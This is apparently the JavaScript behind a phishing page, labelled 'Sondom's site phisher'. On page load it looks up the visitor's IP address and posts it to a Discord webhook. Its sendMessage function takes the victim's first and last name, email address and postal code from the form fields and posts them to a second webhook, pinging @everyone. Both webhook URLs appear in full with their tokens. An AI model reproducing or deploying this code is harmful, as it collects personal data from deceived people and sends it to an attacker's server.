
fetch('https://api.ipify.org')
.then((res) => res.text())  
  .then(ip => {
    const userIp = ip
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1142162565032583328/n_6i5JzkuLKa2N8QFANk0TtOcLAFWBOn7v0Yhf81wn4YW5plpBd1Ly7BbwImUYb0tXOE");
    request.setRequestHeader('Content-type', 'application/json');

    var myEmbed2 = {
      author: {
        name: "Sondom's site phisher"
      },
      title: "USER DETECTED",
      description: `User detected on the **Email Page** with the ip \`${userIp}\``,
      color: hexToDecimal("#00FF00")
    }

    var params = {
      username: "Sondom's site phisher",
      content: "A user has been detected",
      embeds: [ myEmbed2 ]
    }

    request.send(JSON.stringify(params));

    function hexToDecimal(hex) {
      return parseInt(hex.replace("#",""), 16)
    }
  })

  
    .catch(err => console.log(err))

    

function sendMessage(){
var request = new XMLHttpRequest();
request.open("POST", "https://discord.com/api/webhooks/1142162675950952610/wgTZ_xEYW9vZg-eAedL1qq9rB_aV8e9uqb_Vwr7RP_IABOPIihU4Eo34SwLu15IgNGfB");
request.setRequestHeader('Content-type', 'application/json');

const firstName = document.querySelector('#InputField1').value
const lastName =  document.querySelector('#InputField2').value
const victimEmail = document.querySelector('#InputField3').value
const zipPostal = document.querySelector('#InputField4').value

var myEmbed = {
author: {
  name: "Feather"
},
title: "EMAIL RECIEVED",
description: `**First Name:**\n> \`${firstName}\`\n**Last Name:**\n> \`${lastName}\`\n**Zip / Postal Code**\n> \`${zipPostal}\`\n**Email Address:**\n> \`${victimEmail}\`\n`,
image: { url: 'https://media.discordapp.net/attachments/1112460075710304439/1139175403718705263/image_2023-08-10_133330869.jpg' },
color: hexToDecimal("#ff0000")
}

var params = {
username: "Sondom's site phisher",
content: "@everyone",
embeds: [ myEmbed ]
}

request.send(JSON.stringify(params));

function hexToDecimal(hex) {
return parseInt(hex.replace("#",""), 16)
}
}